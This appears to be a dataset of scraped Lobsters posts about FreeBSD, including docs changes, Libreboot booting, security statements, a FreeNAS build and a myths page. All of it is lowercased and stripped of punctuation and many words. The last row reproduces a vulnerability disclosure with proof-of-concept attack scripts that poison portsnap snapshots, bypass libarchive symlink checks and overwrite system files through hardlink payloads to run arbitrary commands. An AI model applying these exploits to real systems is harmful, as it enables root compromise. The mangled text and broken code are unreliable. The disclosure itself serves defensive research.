missed gnome cinnamon finally made official tree centos default linux base hal mostly deprecated throughout free desktop world xorg longer us default stopped recommending use slim want sessiondir enumerated session update expand wine section texlive default tex provider need specify tetex section reorganization stopped using recommending gnome cover firewalling add whole desktop environment section cover pkgng cover installation instead linking zfs installation guide bsdinstall support stop recommending blf loginconf default instead localbase default withoutnouveau gone use tex live fuse builtin add additional device path permission add virtualization section wine package available port
520,Lobsters,freebsd,FreeBSD,User manages to get OpenBSD and FreeBSD working with Libreboot,https://lists.nongnu.org/archive/html/libreboot/2016-08/msg00058.html,user manages get openbsd freebsd working libreboot,date prev date next thread prev thread next date index thread index libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released libreboot gnu libreboot version released,date prev date next thread prev thread next date index thread index libreboot gnu libreboot version released piotr kubaj subject libreboot gnu libreboot version released date sat aug useragent freebsd seems also able boot openbsd libreboot txt mode without mod installation using kopenbsd piotr kubaj wrote know gnu people nt like bsd let make quick succeeded booting freebsd using txt mode newest libreboot get installer boot used kfreebsd bootkernelkernel set freebsdvfsmountfromufs boot nt try install yet signatureasc description openpgp digital signature libreboot gnu libreboot version released guilhem moulin libreboot gnu libreboot version released leah rowe libreboot gnu libreboot version released guilhem moulin libreboot gnu libreboot version released guilhem moulin libreboot gnu libreboot version released leah rowe libreboot gnu libreboot version released guilhem moulin libreboot gnu libreboot version released piotr kubaj libreboot gnu libreboot version released piotr kubaj libreboot gnu libreboot version released andreas kuss
521,Lobsters,freebsd,FreeBSD,FreeBSD Core statement on recent freebsd-update and related vulnerabilities,https://bsdsec.net/articles/freebsd-announce-freebsd-core-statement-on-recent-freebsd-update-and-related-vulnerabilities,freebsd core statement recent freebsdupdate related vulnerability,freebsd core statement recent freebsdupdate related vulnerability freebsd comment powered disqus,freebsd core statement recent freebsdupdate related vulnerability august coresecretary freebsdorg freebsd dear freebsd community freebsd core team freebsd security team would like update community report security vulnerability freebsdupdate portsnap libarchive bspatch understand severity issue actively working resolve issue improve security freebsd recent post freebsdsecurity list raised number question would like address since known vulnerability freebsdupdate portsnap notification community secteam general rule freebsd security officer announce vulnerability released patch reviewing policy case proofofconcept working exploit already public mention fact running freebsdupdate install fix bspatch advisory may actually expose user vulnerability exposed user would need active maninthemiddle attack fetching patch security advisory contain information theoretical implication vulnerability explicit paragraph impact statement may warranted always instruction compile patched bspatch manually rather using freebsdupdate provided part advisory patch included incomplete may still permit heap corruption patch included document dump complete partial fix discussion author bspatch colin percival former freebsd security officer freebsd security team found proposed patch added restriction may break legitimate functionality bspatch possibly preventing valid patch file accepted full fix developed shorter patch resolve main vulnerability immediately released resolve critical issue report smaller patch safe risk breaking bspatch still resolving attack vector provided exploit code larger patch still development released issue addressed automated fuzz testing underway search additional memory corruption bug great care must taken updating binary upgrade utility becomes much difficult fix fact updater broken delicate interaction component must thoroughly tested patch released yet patch libarchive vulnerability released upstream pulled freebsd meantime hardenedbsd created patch libarchive vulnerability first considered inclusion freebsd least complete fix committed upstream however second considered bruteforce committed asis patch freebsd updated binary available security advisory issued security team working redesigning freebsdupdate portsnap signature verification downloaded file processed libarchivetar bspatch utility however change requires modifying metadata format used utility care must taken preserve compatibility existing client existing client used install future update user course option buildapply patch feel comfortable using freebsdupdate security team working diligently resolve issue provide timely correct fix known issue please subscribe freebsdsecuritynotifications mailinglist receive notification future security advisory http http http http please enable javascript view comment powered disqus
522,Lobsters,freebsd,FreeBSD,Vulnerability Update: libarchive,https://hardenedbsd.org/article/shawn-webb/2016-08-07/vulnerability-update-libarchive,vulnerability update libarchive,published mirror bsdnow,around three month ago post published mirror github gist service report multiple vulnerability portsnap freebsdupdate bspatch libarchive detailed date freebsd silent official mailing list however allan jude talked briefly bsdnow freebsd still vulnerable portsnap freebsdupdate bspatch libarchive vulnerability shortly hardenedbsd made aware vulnerability shawn webb researched hardenedbsd affected since hardenedbsd disabled portsnap freebsdupdate default hardenedbsd vulnerable portsnap freebsdupdate vulnerability hardenedbsd supporting infrastructure portsnap freebsdupdate report detailed four vulnerability libarchive two fixed freebsd import libarchive two fixed hardenedbsd commits second commit potential fallout additional testing performed binary update base hardenedbsd relies tool called hbsdupdate enabled default base hbsdupdate affected hbsdupdate update come single tarball contains multiple file within prior series commits fixing hbsdupdate outer tarball validated prior extraction inner file validated enforcing digital signature libarchive vulnerability could allow malicious thirdparty distribute update archive could place arbitrary file filesystem address issue hash current hbsdupdate published part dns txt record hardenedbsd dns entry signed dnssec hbsdupdate verifies utilizing dnssec hbsdupdate ensure version information valid also hash update archive effectively turning dns txt record digital signature outer file publish binary update using hbsdupdatebuild advised due new dnssec validation feature hbsdupdate unboundhost application wired base build freebsd includes code unboundhost however wired build additionally install dnssec root key part hbsdupdate trust store since dnssec key material routinely rotated maintain dnssec root key pinning trust store longterm freebsd fixed issue surrounding libarchive hardenedbsd evaluate using fix hope freebsd communicate community soon regarding alreadypublic vulnerability
523,Lobsters,freebsd,FreeBSD,Hello FreeNAS! Goodbye Drobo and Iomega...,http://blog.fosketts.net/2016/08/03/hello-freenas-goodbye-drobo-iomega/,hello freenas goodbye drobo iomega,bulk home storage revisited capricious content licensee remove content demand fighting today large hard drive virtually guarantee data corruption considering home storage server good option drobo qnap synology freenas alternative freenas favorite router pfsense storage system must never lose data ixsystems freenas mini freenas mini xl build buy thriving freenas community stephen stance hello freenas goodbye drobo freenas build supermicro intel haswell xeon ecc ram drive port case freenas fine mount hard drive side even upsidedown migrating data zfs send receive freenas first impression real job,longtime reader blog know love drobo time come say goodbye old drobos iomega showing age decided go different direction building freenas server article talk thinking behind move later post talk detail hardware software setup lot storage lr tb extra tb disk pack tb tb iosafe tb bulk home storage revisited people goodsized collection music movie photo save share although cloud service like netflix spotify apple music attractive medium sharing perspective recommend relying simply capricious content rely service favorite movie music longterm even icloud music purport mirror entire itunes library cloud reliable purpose recent report revealed bug service leading data loss licensee remove content demand best bet set itunes server downloads everything local storage save case true apple photo application fighting month everyone need local storage much kind simple external drive sound like good idea acceptable either drive crash lost common filesystems used window mac o x protect data corruption last point might sound picky today large hard drive virtually guarantee data corruption considering home storage server advice get home storage server multiple drive availability data integrity checking reliability plus many home na box sharing service built grow fill drive drobo leader space synology qnap make great device familiar storage brand like western digital seagate also multidrive home storage server market device fairly userfriendly somewhat expensive pretty darn slow sharing service pretty limited device boast itunes compatibility usually run firefly medium server opensource application updated year writing people would better served adding home server mac mini running latest mac o x itunes version storing data home storage server choice need terabyte storage good option diskless need price rise rapidly today drobo sell comparable qnap cost impressive synology almost going even drive quick cpu sufficient memory quickly brings mark freenas alternative freenas emerged compelling alternative home na operating system thanks simple installer fullfeatured gui availability addon component used device trick freenas install samba smbcifs sharing firefly itunes netatalk afp share transmission bittorrent client plex medium server like favorite router pfsense freenas built freebsd run intel computer mean run whatever lying around house probably since system work best special hardware pfsense need lot ethernet port freenas need copious hard drive sata connection add pcie card storage system must never lose data trickier sound grotty old pc might reliable think crashing inopportune moment even silently losing data ram old power supply might like job powering half dozen hard disk drive serious freenas user build storage server new enterprisegrade component another option integrated freenas server also like pfsense freenas supported hardware company ixsystems supply integrated turnkey server freenas mini freenas mini xl really excellent box servergrade component tidy packaging buy awful lot nice hardware build buy always true pc world one could build system le money buying integrated machine similarly true valuepriced computer often limited specification lowrent component people still choose buy complete system rather build even component commoditized standardized building home na still pretty daunting average person hundred motherboards cpu case power supply market hard know best happily thriving freenas community help chief among recommendation freenas enthusiast use highquality motherboards ecc memory multicore cpu particularly fond supermicro server motherboards include outofband management ethernet socalled ipmi well many sata port ecc support quality intel ethernet chip another great freenas board asrock rack atom board used ixsystems stephen stance everyone keep local backup music movie photo important data strongly recommend using multidrive na system data integrity checking availability feature like raid along unplugged backup removable drive need capacity consider integrated bringyourowndrive system drobo qnap synology build buy freenas system case storage nerd lot data decided build freenas server considered going qnap freenas mini amount capacity need thanks tech field day video archive meant would spending well box current archive relies two drobos old iomega put fear abandonware since gone year without update really updated pc server run freenas today could updated software future entire freenas series far hello freenas goodbye drobo freenas build supermicro intel haswell xeon ecc ram drive port case freenas fine mount hard drive side even upsidedown migrating data zfs send receive freenas first impression note linked amazon product used associate id make money click buy something really make money way real job nice offset cost gear way bought everything newegg rather amazon associate program good
524,Lobsters,freebsd,FreeBSD,DragonFlyBSD is unlikely (Annoucning DragonFly BSD! (sic)) (2003),https://lists.freebsd.org/pipermail/freebsd-current/2003-July/006917.html,dragonflybsd unlikely annoucning dragonfly bsd sic,annoucning dragonfly bsd jhs berklixorg dillon apollobackplanecom http wwwdragonflybsdorg http wwwdragonflybsdorg http berklixcomscanjet http berklixorgbim information freebsdcurrent mailing list,annoucning dragonfly bsd julian stacey jhs berklixorg thu jul pdt periodicaly someone masquerade matt dilllon targeted troll need work extra hard establish credibility poster address avoid suspicion troll work phone number maybe troll course need work extra hard also convince u maybe time poster real matthew dillon doubt matthew dillon dillon apollobackplanecom appeared write announcing dragonfly bsd http wwwdragonflybsdorg new kernel approach seems plausible tech target merit leave others completely rewrite packaging distribution system seems unliklelyover ambitious divisive suspicion troll new kernel ok maybe cross fertilise others could nt run exisiting usrsrc free net open new port package system ok need felt even though freebsd port popular got adoped looked project nt stop changing recently file reduction could nt run exisiting bsds presumably freebsd port project really sisyphus sp greek anyway latin alphabet effort dubious idea divide number shoulder load sits already another cross platform port project anyway freshports new distribution mechanism whatever maybe better technology adopted merged bsds http wwwdragonflybsdorg may troll erection constructed nothing real see troll site click sample code inside browser cvsup extract localy check real code interest others confirm real friend localy know work meet matthew dillon announce list really really taken seriously perhaps worth looking maybe real matt return desk announce another troll attempt logo useless troll give away business yesterday delivered hp network scanjet nt removed freebsd installed http berklixcomscanjet stuck freebsd tattoo wc chassis product name stick fine plastic though text implies human skin tried imo linux bsd logo rather childish clearly used business well personal would nt stick dragonflybsd slavering head rubbish bin last night munich bsd monthly gathering http berklixorgbim month convenor brought chuck daemon stood verticaly recognition symbol shovin foot big clean ash tray penguin also made stand low centre gravity help would one slavering head bin first sentence main page seem possible linux troll give away dragonfly operating system environment designed logical continuation o series operating system belong class linux based unix ideal apis lot mention page list list includes founder fake site maybe many bsd already complete bsds nt personal business benefit kernel tool experiment portspackaging etc could useful though benefit work fully integratable split available bsd workforce guess original post fake masquerade call troll web site probably apology matt wrong real matt hopefuly appreciates u cautious tel eg id check julian stacey freelance system engineer unix net consultant munich ihr rauchen mein allergischer kopfschmerz schnupftabak probieren information freebsdcurrent mailing list
525,Lobsters,freebsd,FreeBSD,A slow / low-end system capable of running most modern BSDs,https://www.geeklan.co.uk/?p=2130,slow lowend system capable running modern bsds,,looking test change related buffering cat wondered slowest system could use capable running current version netbsd freebsd openbsd old pc arm based beaglebone black sprang mind immediately powerpc mac apart sun fire sparc hardware supported netbsd openbsd present prealpha rough cut day version support may going away freebsd moving forward considered beaglebone black currently netbsdhead boot freebsd issue running dtrace list based powerpc mac supported choice bsds unfortunately get working disk burnt freebsd iso file try powerbook settled running build alix ram geode cpu currently running without issue problem bsds little modern high spec though test
526,Lobsters,freebsd,FreeBSD,Myths about FreeBSD,https://wiki.freebsd.org/Myths,myth freebsd,myth freebsd freebsd myth page freebsd good server desktop trueos freebsd closed development model freebsd o x without good bit freebsd make compile everything source freebsd unix good bit freebsd come solaris freebsd driver freebsd went downhill freebsd lack software freebsd support virtualisation virtualbox virtualbox bsd license mean company nt contribute back,myth freebsd draft content freebsd myth page freebsd good server desktop freebsd fullfeatured sound subsystem giving lowlatency inkernel mixing allowing multiple application play sound independent volume setting configuration default install includes xorg installing desktop environment kde gnome easy selecting metapackage whichever prefer even much effort trueos fullfeatured desktop system built top freebsd easytouse installer option commercial support freebsd closed development model freebsd developer around world commit access repository many willing commit patch third party want get idea number patch committed behalf developer search submitted commit log time writing twenty thousand ten percent commits patch accepted regular contributor usually encouraged apply commit access dictator freebsd project decision made people willing work case dispute resolved group developer elected every two year everyone committed code preceding year allowed vote freebsd o x without good bit much myth o x freebsd o x freebsd pretty gui two operating system share lot code example userland utility c library o x derived freebsd version code flow work direction example freebsd later include c stack compiler originally developed o x major part work done apple employee part different xnu kernel used o x includes subsystem older version freebsd mostly independent implementation similarity userland however make much easier port o x code freebsd system example libdispatch grand central dispatch apple marketing libc written o x worked freebsd o freebsd make compile everything source freebsd port collection powerful way installing software allowing customise option variety thirdparty program library however way installing software freebsd always able install software binary package pkgng project added new package format package management tool providing modern set tool binary package management install pkgng port tree portsmgmtpkg older version freebsd included default freebsd newer freebsd unix freebsd linear descendent original unix via berkeley software distribution continued evolve time last year seen zfs become production quality support ethernet massive improvement sound subsystem support host improvement say freebsd abandoned unix root many reason unix became popular include freely redistributable system easy port new platform set simple tool one thing well easy use together kernel performed well computer normal human could afford freebsd maintains tradition good bit freebsd come solaris freebsd imported two highprofile feature opensolaris dtrace zfs well supported freebsd zfs particular focus lot attention freebsd developer including employed ixsystems company support freenas development sell commercial na device based freebsd freebsd contributor also work closely developer illumos opensource fork solaris improving feature spite advantage zfs still relatively small part overall system zfs dtrace account code kernel code base system consider freebsd good true hopefully nt freebsd driver problem faced operating system even new version window time user nt care total number driver driver exist hardware omission term driver support freebsd support wide range network card including increasing number chipsets sound card amd intel nvidia gpus device support constantly moving target ca nt tell hardware maker stop releasing new hardware year catch new device take time support although manufacturer provide driver example nvidia provide driver gpus intel newest network storage controller manufacturer provide significant help freebsd driver writer including broadcom jmicron hp mellanox chelsio solarflare find device nt supported please let project know also notify manufacturer thing motivates hardware manufacturer support operating system knowledge customer want freebsd went downhill release series stable exactly kind release freebsd project proud associated many user continued running year series happened transition better multithreading support involved replacing single lock around kernel set smaller lock used individual subsystem imagine involved lot work easy get wrong time also shipped two threading implementation complicating matter first two release series marked developer aimed broader audience failed live expectation freebsd userbase number large user stuck moved different system series painful lesson project one learned series regained stability release regained singleprocessor performance series saw number published benchmark third party showing freebsd scaling better multiprocessor system operating system tested release come significant improvement improved sound subsystem zfs dtrace journaling ufs many others stability performance remain key goal freebsd system freebsd lack software freebsd port collection currently contains piece software difficult compare number package repository program split differently example gcc port freebsd installs program library split package debian depending version gcc general thing want run fact port collection provides certain relatively obscure piece software need system nt frequently cited reason people choosing freebsd software port collection run natively freebsd open source software relatively osagnostic requires little modification compile run freebsd exception including thing like valgrind require detailed understanding system running relatively rare usually ported sufficient interest proprietary software problem vendor opera provide freebsd version code freely distributable usually available port collection software must run kind emulation example linux binary run linux abi layer linux system call translated freebsd equivalent overhead slightly increased cost system call usually difficult measure performance difference running linux program linux freebsd case program reported running faster freebsd linux due efficient implementation underlying call example linux version flash plugin run using nspluginwrapper linux abi layer native web browser similar solution exists running window application port collection includes wine capable running lot existing window application freebsd support virtualisation freebsd support running xen guest domu including amazon thanks work done jointly microsoft netapp citrix also possible run freebsd microsoft hyperv hypervisor freebsd include control domain support many version freebsd also vmware supported guest operating system list freebsd also support virtualbox host guest find virtualbox guest addition hypervisor port collection freebsd also act host operating system bhyve bsd hypervisor giving variety option running freebsd vms top freebsd finally nt require full virtualisation use jail subsystem run isolated freebsd userlands even linux userlands using linux abi layer single freebsd kernel jail even provided independent network stack etc single machine used emulate entire machine room bsd license mean company nt contribute back bsd license mean take code freebsd whatever want long nt sue u pretend wrote without legal obligation share code possible use freebsd code almost anywhere company almost certainly take code modify never give anything back free however many nt consider example case two major internet company google yahoo former base internal infrastructure gpl operating system latter us freebsd google distribute modified operating system keep thing like googlefs private case like software developed inhouse use difference requirement share change two license however issue linking mean example gpl library ca nt used bsd licensed one could lot company made significant contribution freebsd year nt usually sense altruism result legal threat dependable motif self interest maintaining fork project especially one developed quickly freebsd expensive pushing change upstream lot cheaper change useful wider community core business interest cheaper publish reduce maintenance cost fork keep private
527,Lobsters,freebsd,FreeBSD,Attacks against FreeBSD Update components,https://gist.github.com/anonymous/e48209b03f1dd9625a992717e7b89c4f,attack freebsd update component,,noncryptanalytic attack freebsd update component portsnap libarchivebsdtar bspatch portsnap portsnap script depends cryptographic chain trust based hash anchored rsa public key pubssl trusted keyprint defined etcportsnapconf unfortunately initial snapshot tarball properly verified allowing resourceful attacker escape cryptographic chain trust compromise system portsnap script function fetchsnapshot fetch initial snapshot tarball immediately extract without hash verification indeed hash verify tarball hash tarball filename hash tindexnew metadata file fetched earlier exploitation vector follow vulnerability libarchivebsdtar subject second security report symlink attack obvious impact allowing file system overwritten paving way immediate command execution hardlink attack typically restricted var filesystem segmentation target varrunldelfsohints ii attacker ability smuggle unexpected tarball content first glance appears fetchsnapshot verifies two call function fetchsnapshotverify content tarball however nothing done content tarball first report considers second class vector exploitation vector fetchsnapshotverify error function fetchsnapshotverify contains following hash check gunzip c snap f q f problem f expands file hash without gz suffix documented gunzip manual page gunzip first try opening file snap f failing automatically append suffix try opening file snap f gz attacker supply snap f snap f gz first file clean pass hash check second file malicious portsnap script explicitly appends gz suffix every use gunzip attacker malicious file one chosen extraction exploitation vector defense bandaid solution vector add gz extension gunzip c snap f gz q f exploitation vector file prediction attacker smuggle file used later portsnap run fetching new file based difference tindextindexnew indexindexnew function fetchmakepatchlist fetchupdate request new file already exist vardbportsnapfiles already exist attacker provided overwritten subject hash verification well good would seem attacker face difficult task guessing future hash fortunately attacker usually asynchrony portsnap server snapshop tag snapshotssl update tag latestssl initialization run portsnap via function fetchrun grab snapshot tarball handle automatically check available update attacker ensure tarball contains malicious file snapxgz x hash learned already available update server exploitation vector defense four demonstration attack given would foiled snapshot tarball cryptographically verified perhaps via hash added snapshot tag would also provide protection libarchivebsdtar attack surface barely scratched second security report filesystembased attack investigated line code autodetected multiformat support libarchivebsdtar far dangerous trust preverification root privilege general problem portsnap along freebsdupdate contains preverification processing strictly necessary hash checked running gunzip bspatch various characterstream utility rather leading problem bspatch memorycorruption attack third security report contrast port system proper guard virtually processing checksum target attack demonstration attack example attack using exploitation vector achieves arbitrary command execution port system next used initialization run portsnap fetch extract attack example attack using exploitation vector achieves arbitrary command execution port system next used initialization run portsnap fetch extract attack example attack using exploitation vector achieve immediate arbitrary command execution initialization run portsnap fetch extract attack purely demonstration purpose effort made make stealthy attack particular noisy bother extracting full port tree following patch applied usrsbinportsnap modified script allows convenient simulation actual attack simulation mean modified script cheat corrupt snapshot could achieve effect outside cryptographic chain trust full description individual attack appear afterward return attackone evilcmdsevilcmds usrbintouch echo x snapshot cut tagnew tgz index look index tindexnew cut tar xz numericowner f snapshot snap mk zgrep mkbsdcommandsmk snap indexgz cut tar xzf snap mkgz echo evilcmds mkbsdcommandsmk mv snap mkgz snap mk tar czf snap mkgz mkbsdcommandsmk rm f snapshot tar czf snapshot snap rm rf snap mk attacktwo evilcmdsevilcmds usrbintouch echo x indexold look index tindex cut indexnew look index tindexnew cut mk zgrep mkbsdcommandsmk file indexoldgz cut tar xzf file mkgz echo evilcmds mkbsdcommandsmk tar czf xgz mkbsdcommandsmk bcmhash gunzip c xgz mv xgz file bcmhashgz zcat file indexoldgz echo mkbsdcommandsmk bcmhash gzip file indexnewgz rm rf mk attackthree evilcmdsusrbintouch cp usrbincut echo usrbincut saved indexnew look index tindexnew cut cmdsfilevardbportsnapfilesevilcmdssh cmdshash jot b symfileportsnapindex symhash jot b f cat file indexnew eof cmdsfile cmdshash symfile symhash eof gzip file indexnew cat cmdsfile eof binsh evilcmds eof chmod cmdsfile touch file cmdshash gzip file cmdshash ln usrbincut symfile tar czf file symhashgz symfile rm f symfile attackfour evilcmdsusrbintouch cp usrbincut echo usrbincut saved indexnew look index tindexnew cut symfilesym symhash jot b cmdshash jot b f cat file indexnew eof symfile symhash p cmdshash eof gzip file indexnew ln usrbin symfile tar czf file symhashgz symfile rm f symfile mkdir symfile cat symfilecut eof binsh evilcmds eof chmod symfilecut tar czf file cmdshashgz symfilecut rm r symfile fetch snapshot tarball extract verify fetchsnapshot fetchtag snapshot echo fetching snapshot generated date r snapshotdate fetch r http servername snapshothash tgz return attack one attackone echo n extracting snapshot tar xz numericowner f snapshothash tgz snap return rm snapshothash tgz fetchmetadata return fetchmetadatasanity return attack two attacktwo attack three attackthree attack four attackfour echo n updating date r oldsnapshotdate echo date r snapshotdate attack directory usrports vardbportsnap cleaned attackone evilcmdsevilcmds usrbintouch echo x snapshot cut tagnew tgz index look index tindexnew cut tar xz numericowner f snapshot snap mk zgrep mkbsdcommandsmk snap indexgz cut tar xzf snap mkgz echo evilcmds mkbsdcommandsmk mv snap mkgz snap mk tar czf snap mkgz mkbsdcommandsmk rm f snapshot tar czf snapshot snap rm rf snap mk attack simulates delivery corrupt snapshot tarball including two file snap mk snap mkgz snap mk contains clean mkbsdcommandsmk used pas hash verification snap mkgz contains custom mkbsdcommandsmk used extraction mkbsdcommandsmk file updated often modification overwritten unconditionally included mkbsdportmk command inside run using port system attackone portsnap fetch portsnap extract tail n usrportsmkbsdcommandsmk evilcmds usrbintouch echo x cd usrports l l file directory make fetch l attack directory usrports vardbportsnap cleaned attacktwo evilcmdsevilcmds usrbintouch echo x indexold look index tindex cut indexnew look index tindexnew cut mk zgrep mkbsdcommandsmk file indexoldgz cut tar xzf file mkgz echo evilcmds mkbsdcommandsmk tar czf xgz mkbsdcommandsmk bcmhash gunzip c xgz mv xgz file bcmhashgz zcat file indexoldgz echo mkbsdcommandsmk bcmhash gzip file indexnewgz rm rf mk attack simulates delivery corrupt snapshot tarball including two malicious file snap bcmhashgz snap indexnewgz snap bcmhashgz contains custom mkbsdcommandsmk snap indexnewgz contains update index note script peek inside tindexnew update index hash cheating attacker learn information update metadata available server assuming update available typically case update index otherwise sane index file following line appended mkbsdcommandsmk bcmhash portsnap discovers update index already exists filesystem file overwritten hashverified attacktwo portsnap fetch portsnap extract tail n usrportsmkbsdcommandsmk evilcmds usrbintouch echo x cd usrports l l file directory make fetch l attack directory usrports vardbportsnap cleaned attackthree evilcmdsusrbintouch cp usrbincut echo usrbincut saved indexnew look index tindexnew cut cmdsfilevardbportsnapfilesevilcmdssh cmdshash jot b symfileportsnapindex symhash jot b f cat file indexnew eof cmdsfile cmdshash symfile symhash eof gzip file indexnew cat cmdsfile eof binsh evilcmds eof chmod cmdsfile touch file cmdshash gzip file cmdshash ln usrbincut symfile tar czf file symhashgz symfile rm f symfile attack simulates delivery corrupt snapshot tarball including four malicious file snap indexnewgz snapevilcmdssh snap cmdshashgz snap symhashgz snap indexnewgz contains update index snapevilcmdssh shell script containing arbitrary command snap cmdshashgz dummy file snapevilcmdssh snap symhashgz contains symlink portsnapindex usrbincut update index following vardbportsnapfilesevilcmdsshaaa aaa portsnapindexfff fff idea use symlink break usrports although tar operating intended without special switch refuse extract symlinks happily extract symlinks pointing anywhere system allowing another utility cause damage symlinks observe following line portsnap script extractmetadata z refuse sort workdir index portsdir portsnapindex extraction portsnapindex become symlink pointing usrbincut line cause usrbincut overwritten sorted update index word usrbincut contain following portsnapindexfff fff vardbportsnapfilesevilcmdsshaaa aaa usrbincut executed extractindices kernel reject new usrbincut execution shell notice failed execution try running usrbincut shell script pipe character interpreted command delimiters hence achieved execution vardbportsnapfilesevilcmdssh three command fail course copy original usrbincut attackthree portsnap fetch l l file directory portsnap extract l cat usrbincut portsnapindexfff fff vardbportsnapfilesevilcmdsshaaa aaa mv usrbincut attack directory usrports vardbportsnap cleaned attackfour evilcmdsusrbintouch cp usrbincut echo usrbincut saved indexnew look index tindexnew cut symfilesym symhash jot b cmdshash jot b f cat file indexnew eof symfile symhash p cmdshash eof gzip file indexnew ln usrbin symfile tar czf file symhashgz symfile rm f symfile mkdir symfile cat symfilecut eof binsh evilcmds eof chmod symfilecut tar czf file cmdshashgz symfilecut rm r symfile attack simulates delivery corrupt snapshot tarball including three malicious file snap indexnewgz snap symhashgz snap cmdshashgz snap indexnewgz contains update index snap symhashgz contains symlink sym usrbin snap cmdshashgz contains shell script symcut update index following symaaa aaa pfff fff attack idea use symlink break usrports overwrite usrbincut time simplify attack tar p switch injection disable usual symlink check observe following line portsnap script extractrun rm f portsdir file tar xz numericowner f workdir file hash gz c portsdir file symlink sym usrbin extracted shell script symcut extracted symlink overwriting usrbincut tar symlink check bypassed file expands p switch copy original usrbincut attackfour portsnap fetch l l file directory portsnap extract l cat usrbincut binsh usrbintouch mv usrbincut libarchivebsdtar nonhead branch freebsd still use libarchivebsdtar base released feb next version released recently may added head branch port unless invoked p switch bsdtar try prevent three class filesystem attack absolute path handled bsdtar via editpathname tarutilc handled bsdcpio upstream commit mar addressing nothing said bsdcpio report note freebsd nonhead still vulnerable particular bug dotdot path handled libarchive via cleanuppathname libarchivearchivewritediskposixc extraction symlinks handled libarchive via checksymlinks libarchivearchivewritediskposixc three vulnerability exist checksymlinks one allowing file overwrite outside extraction directory discovered independently already silently fixed upstream though freebsd nonhead still vulnerable two vulnerability one allowing file overwrite outside extraction directory allowing permission change directory outside extraction directory new exist freebsd upstream source fourth vulnerability also new existing freebsd upstream source arises fact linktarget pathnames subjected security check listed combined fact libarchive support posix feature hard link data payload allows file overwrite outside extraction directory hardlinking constraint vulnerability matrix summarizing information follows nonhead headports latest upstream bsdcpio n n vuln n n vuln vuln vuln vulnerable n vulnerable earlier version may also vulnerable vulnerability affect freebsd nonhead possibly earlier description checksymlinks check first pathname component symlinks pathname checksymlinks ensure symlink case file fortuitously still unlinked elsewhere libarchive symlink checked demonstration libarchive correctly catch echo hello tmpmyfile ln tmp tar cf xtar rm mkdir echo goodbye touch clearsafecache tar rf xtar clearsafecache rm r clearsafecache l xtar tar tf xtar clearsafecache tar xvf xtar x x clearsafecache x extract symlink tar error exit delayed previous error cat tmpmyfile hello libarchive fails catch rm mkdir ln tmp tar cf xtar rm r mkdir p echo goodbye touch clearsafecache tar rf xtar clearsafecache rm r clearsafecache l xtar tar tf xtar clearsafecache tar xvf xtar x x clearsafecache x cat tmpmyfile goodbye defense independently discovered silently fixed upstream commit jan associated version bump cve id vuln report unclear whether security impact recognized fix included recent release mentioned security fix section release note vulnerability affect freebsd headports freebsd nonhead possibly earlier description checksymlinks fails lstat call check errno enoent r lstat name st r hit dir nt exist stop errno enoent break error condition get free pas particular enametoolong get free pas design function archivewritediskheader call editdeepdirectories checksymlinks effort accommodate deep directory unfortunately interaction symlink check deepdirectory support introduces security vulnerability symlink check effectively disabled long pathnames demonstration binsh elementstr jot b elementlen currdir pwd exec lt elementnum mkdir elementstr cd elementstr done ln slink tar cf currdirxtar c currdir elementstr rm f slink mkdir p slink dirname cat slink tar rf currdirxtar c currdir elementstr cd currdir rm rf elementstr cat tmpmyfile cat tmpmyfile file directory echo data want data tmpmyfile data l data xtar tar xf xtar error message omitted cat tmpmyfile data want rm r data xtar echo overwrite existing file data tmpmyfile data tar xf xtar error message omitted cat tmpmyfile overwrite existing file defense best solution probably excise function editdeepdirectories altogether change checksymlinks return archivefailed lstat fails errno enoent appear worth trouble trying work around pathmax incidentally posix defines pathmax include terminating nul editdeepdirectories remain two strlen check fixed accordingly pathmax pathmax vulnerability affect freebsd headports freebsd nonhead possibly earlier description checksymlinks employ singlebin safety cache optimization idea checking pathname aaabbbccc symlinks next pathname aaabbbddd need recheck aaabbb symlinks unfortunately cached aaabbbccc directory included illustration purpose simple filename also work allows symlink check bypassed next entry pathname one aa aaa aaab aaabb aaabbb aaabbbc aaabbbcc aaabbbccc function restoreentry createfilesystemobject libarchivearchivewritediskposixc appear constrain impact vulnerability freebsd permission change arbitrary directory root user affected default operation whereas normal user may need issue p switch distinct p switch affected mkdir tmpmydir l ld tmpmydir drwxrxrx ln tmpmydir sym tar cf xtar sym rm sym mkdir sym chmod sym tar rf xtar sym rmdir sym tar tf xtar sym sym tar xf xtar l ld tmpmydir drwxrxrx l sym xtar rm sym tar xf xtar p l ld tmpmydir drwxrwxrwx rm r tmpmydir root user mkdir tmpmydir l ld tmpmydir drwxrxrx ln tmpmydir sym tar cf xtar sym rm sym mkdir sym chmod sym tar rf xtar sym rmdir sym tar tf xtar sym sym tar xf xtar l ld tmpmydir drwxrwxrwx defense vulnerability subverts assurance checksymlinks fix local checksymlinks might also worth investigating whether performance gain safety cache worth added complexity hairiness securitycritical function vulnerability affect freebsd headports freebsd nonhead possibly earlier description recall three class filesystem attack listed earlier absolute path dotdot path extraction symlinks check applied usual pathnames symlinks hard link target one exception target hard link subjected absolutepath check tarutilc freebsd revision upstream commit seems revision submitted upstream rewritten different form commit strip leading slash hardlink target though security reason archive entry hard link use dotdot pathnames target point file system subject usual hardlinking constraint alternatively system follow symlinks link implementationdefined behavior supported freebsd symlink first extracted us absolute dotdot pathnames point file hardlink target symlink mean filtering hardlink target dotdot path sufficient address problem ability point hard link outside file becomes serious consider libarchive support posix feature hard link data payload allows attacker point hard link existing target file outside extraction directory use data payload overwrite file demonstration exploit code included cd tmpcage l cc larchive echo hello tmptarget echo goodbye data xtar data p tmptarget tar tvf xtar rwxrwxrwx jan p link tmptarget tar xvf xtar x p cat tmptarget goodbye code could rewritten use symlinks instead dotdot path cd tmpcage l echo hello tmptarget echo goodbye data ln tmptarget sym xtar data p sym tar tvf xtar rwxrwxrwx jan p link sym tar xvf xtar x p cat tmptarget goodbye include systypesh include sysstath include archiveh include archiveentryh include fcntlh include stdioh include stdlibh include unistdh static void makearchive char char char char static void patcharchive char char static void makearchive char archive char file char pathname char linkname int fd ssizet len char buf struct stat struct archive struct archiveentry ae archivewritenew archivewritesetformatpax archivewriteopenfilename archive ae archiveentrynew archiveentrysetpathname ae pathname dummy file type aesethardlink priority anyway archiveentrysetfiletype ae aeifreg stat file archiveentrysetsize ae sstsize archiveentrysetuid ae archiveentrysetgid ae archiveentrysetperm ae libarchive allows extraction hardlink payload per posix spec pax without armtwisting set ctime force addition pax extended header libarchive nt zero size field extraction libarchive disallows creation 